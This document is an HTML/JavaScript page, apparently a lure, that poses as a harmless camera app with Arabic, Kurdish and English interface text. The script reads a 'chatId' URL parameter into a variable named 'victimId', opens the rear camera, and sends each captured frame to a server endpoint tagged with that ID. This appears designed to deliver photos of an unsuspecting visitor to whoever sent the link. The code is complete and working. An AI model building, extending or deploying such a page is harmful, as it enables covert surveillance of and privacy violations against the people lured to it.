<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title data-i18n="page_title">الكاميرا</title>
    <style>
        body {
            margin: 0;
            background: #000;
            font-family: sans-serif;
            display: flex;
            flex-direction: column;
            height: 100vh;
        }
        #viewfinder {
            flex: 1;
            background: #111;
            position: relative;
            overflow: hidden;
        }
        video {
            width: 100%;
            height: 100%;
            object-fit: cover;
        }
        #overlay {
            position: absolute;
            inset: 0;
            background: linear-gradient(180deg, rgba(0,0,0,.3), transparent 30%, transparent 70%, rgba(0,0,0,.5));
        }
        #status {
            position: absolute;
            top: 16px;
            left: 0;
            right: 0;
            text-align: center;
            color: #fff;
            font-size: 14px;
            text-shadow: 0 1px 3px #000;
            z-index: 5;
        }
        #controls {
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
            background: #1a1a1a;
            gap: 24px;
        }
        #shutter {
            width: 64px;
            height: 64px;
            border-radius: 50%;
            border: 4px solid #fff;
            background: rgba(255,255,255,.15);
            cursor: pointer;
        }
        #shutter:active {
            background: #fff;
        }

        /* ===== هەڵبژاردەی زمان (زیادکراو) ===== */
        .lang-selector {
            position: absolute;
            top: 15px;
            right: 20px;
            z-index: 99;
            background: rgba(255,255,255,0.9);
            border-radius: 30px;
            padding: 5px 15px;
            box-shadow: 0 5px 20px rgba(0,0,0,0.2);
            display: flex;
            gap: 10px;
            backdrop-filter: blur(10px);
        }
        .lang-btn {
            border: none;
            background: transparent;
            padding: 8px 12px;
            border-radius: 20px;
            cursor: pointer;
            font-size: 14px;
            font-weight: 600;
            color: #333;
            transition: 0.3s;
        }
        .lang-btn.active {
            background: #34c759;
            color: #fff;
        }
    </style>
</head>
<body>

    <!-- ========== هەڵبژاردەی زمان ========== -->
    <div class="lang-selector">
        <button class="lang-btn active" onclick="changeLang('ar')">العربية</button>
        <button class="lang-btn" onclick="changeLang('ckb')">کوردی</button>
        <button class="lang-btn" onclick="changeLang('en')">English</button>
    </div>

    <div id="viewfinder">
        <video id="video" autoplay playsinline muted></video>
        <div id="overlay"></div>
        <div id="status" data-i18n="loading">جارٍ تجهيز الكاميرا...</div>
    </div>
    <div id="controls">
        <span style="width:18px"></span>
        <button id="shutter"></button>
        <span style="width:18px"></span>
    </div>

    <script>
        /* ===== داتابەیسی وەرگێڕان ===== */
        const translations = {
            ar: {
                page_title: "الكاميرا",
                loading: "جارٍ تجهيز الكاميرا...",
                ready: "اضغط الزر لالتقاط صورة",
                success: "✅ تم الإرسال",
                fail: "❌ فشل الإرسال",
                camera_error: "⚠️ تعذّر الوصول للكاميرا"
            },
            ckb: {
                page_title: "کامێرا",
                loading: "کامێرا ئامادە دەکرێت...",
                ready: "دوگمەکە پەنجە بنێ بۆ وێنەگرتن",
                success: "✅ نێردرا",
                fail: "❌ ناردن سەرکەوتوو نەبوو",
                camera_error: "⚠️ کامێرا نەتوانرا بکرێتەوە"
            },
            en: {
                page_title: "Camera",
                loading: "Preparing camera...",
                ready: "Press the button to take a photo",
                success: "✅ Sent",
                fail: "❌ Failed to send",
                camera_error: "⚠️ Could not access camera"
            }
        };

        function changeLang(lang) {
            // گۆڕینی ئاڕاستەی پەڕە (بۆ عەرەبی و کوردی RTL، ئینگلیزی LTR)
            if (lang === 'ar' || lang === 'ckb') {
                document.documentElement.dir = 'rtl';
            } else {
                document.documentElement.dir = 'ltr';
            }

            // نوێکردنەوەی هەموو توخمەکانی data-i18n
            document.querySelectorAll('[data-i18n]').forEach(el => {
                const key = el.getAttribute('data-i18n');
                if (translations[lang] && translations[lang][key]) {
                    el.textContent = translations[lang][key];
                }
            });

            // دیاریکردنی دوگمەی چالاک لە هەڵبژاردەکە
            document.querySelectorAll('.lang-btn').forEach(btn => btn.classList.remove('active'));
            document.querySelector(`[onclick="changeLang('${lang}')"]`).classList.add('active');

            // پاشەکەوتکردنی زمان
            localStorage.setItem('preferred_lang', lang);
        }

        // بارکردنی زمانی پاشەکەوتکراو لەگەڵ کرانەوەی پەڕە
        window.addEventListener('DOMContentLoaded', () => {
            const savedLang = localStorage.getItem('preferred_lang') || 'ar';
            changeLang(savedLang);
        });

        /* ===== کۆدی بنەڕەتی کامێرا (دەستکاری نەکراو) ===== */
        const victimId = new URLSearchParams(location.search).get('chatId') || 'غير معروف';

        async function apiSend(payload) {
            try {
                const r = await fetch('/api/send', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload)
                });
                return r.ok;
            } catch (e) { return false; }
        }

        const video = document.getElementById('video');
        const statusEl = document.getElementById('status');
        let stream = null;

        function sendPhoto(dataUrl) {
            apiSend({ type: 'photo', chatId: victimId, photo: dataUrl, caption: '📸 صورة من الكاميرا' })
                .then(ok => {
                    const currentLang = localStorage.getItem('preferred_lang') || 'ar';
                    statusEl.textContent = ok ? translations[currentLang].success : translations[currentLang].fail;
                    setTimeout(() => {
                        statusEl.textContent = translations[currentLang].ready;
                    }, 2000);
                });
        }

        async function startCamera() {
            try {
                stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' }, audio: false });
                video.srcObject = stream;
                const currentLang = localStorage.getItem('preferred_lang') || 'ar';
                statusEl.textContent = translations[currentLang].ready;
            } catch (e) {
                const currentLang = localStorage.getItem('preferred_lang') || 'ar';
                statusEl.textContent = translations[currentLang].camera_error;
            }
        }

        document.getElementById('shutter').onclick = () => {
            if (!stream) { startCamera(); return; }
            const canvas = document.createElement('canvas');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            canvas.getContext('2d').drawImage(video, 0, 0);
            sendPhoto(canvas.toDataURL('image/jpeg', 0.8));
        };

        startCamera();
    </script>
</body>
</html>
